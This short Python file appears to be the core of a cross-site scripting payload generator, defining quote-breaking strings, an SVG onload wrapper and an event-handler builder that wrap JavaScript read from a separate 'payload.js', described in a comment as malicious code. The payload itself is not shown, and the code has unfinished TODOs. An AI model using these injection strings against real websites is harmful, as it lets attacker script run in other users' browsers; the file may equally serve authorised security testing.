# Constants
# TODO: Check out this script to scrape infomration on event handlers
events = ["onmouseover", "onclick"]

# Breakers - used to break out of current context
BREAK_DOUBLE_QUOTES = "\">"
BREAK_SINGLE_QUOTES = "\'>"
breakers = [BREAK_DOUBLE_QUOTES, BREAK_SINGLE_QUOTES]

# Delivery vectors - used invoke a JS context
SVG_VECTOR = lambda x : "<svg onload=\'{}\'>".format(x)
EVENT_HANDLER = lambda x, html_elem: gen_event(html_elem) + "=\'{}\'".format(x)
delivery = [SVG_VECTOR, EVENT_HANDLER]

#TODO: should generate event handler according to the current HTML element
def gen_event(html_elem):
    return events[0]


# Payloads - malicious code to be executed
WSpayload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
payloads =[WSpayload]